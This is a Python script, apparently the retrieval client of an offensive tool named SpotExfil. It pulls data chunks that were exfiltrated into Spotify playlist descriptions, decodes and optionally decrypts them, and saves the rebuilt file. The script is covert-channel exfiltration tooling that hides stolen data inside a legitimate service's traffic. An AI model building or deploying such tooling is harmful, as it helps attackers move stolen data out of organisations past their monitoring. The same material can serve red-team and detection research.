#!/usr/bin/env python3
"""SpotExfil Retrieve - Retrieve exfiltrated data from Spotify playlists.

Reads payload chunks from playlist descriptions, decodes (and optionally
decrypts) them back to the original file.

Pre-requisites:
    Environment variables:
        SPOTIFY_USERNAME, SPOTIFY_CLIENT_ID,
        SPOTIFY_CLIENT_SECRET, SPOTIFY_REDIRECTURI
"""

import argparse
import sys

import encoding
import spotapi as spot

__author__ = '@sourcefrenchy'
__copyright__ = 'none'
__email__ = 'jmamblat@icloud.com'
__status__ = 'PROTOTYPE'


def parse_args():
    """Parse command-line arguments.

    Returns:
        argparse.Namespace with 'receive', optional 'key' and 'output'.
    """
    parser = argparse.ArgumentParser(
        description='SpotExfil: retrieve data from Spotify playlists'
    )
    parser.add_argument(
        '-r', '--receive', action='store_true', required=True,
        help='Retrieve and decode the payload'
    )
    parser.add_argument(
        '-k', '--key', default=None,
        help='Decryption passphrase (must match encryption key)'
    )
    parser.add_argument(
        '-o', '--output', default=None,
        help='Output file path (default: print to stdout or payload.bin)'
    )
    return parser.parse_args()


def main():
    """Main entry point for the retrieval client."""
    args = parse_args()

    spotify = spot.Spot()
    cipher = encoding.Subcipher(spotify, encryption_key=args.key)

    results = spotify.retrieve_playlists()
    decoded = cipher.decode_payload(results)

    if not decoded:
        print("[!] No data decoded")
        sys.exit(1)

    output_path = args.output

    try:
        # Try to decode as text
        text = decoded.decode('utf-8')
        if output_path:
            with open(output_path, 'w') as f:
                f.write(text)
            print(f"[*] Text payload saved to {output_path}")
        else:
            print(text)
    except UnicodeDecodeError:
        # Binary payload
        output_path = output_path or "payload.bin"
        with open(output_path, 'wb') as f:
            f.write(decoded)
        print(f"[*] Binary payload saved to {output_path}")


if __name__ == "__main__":
    main()
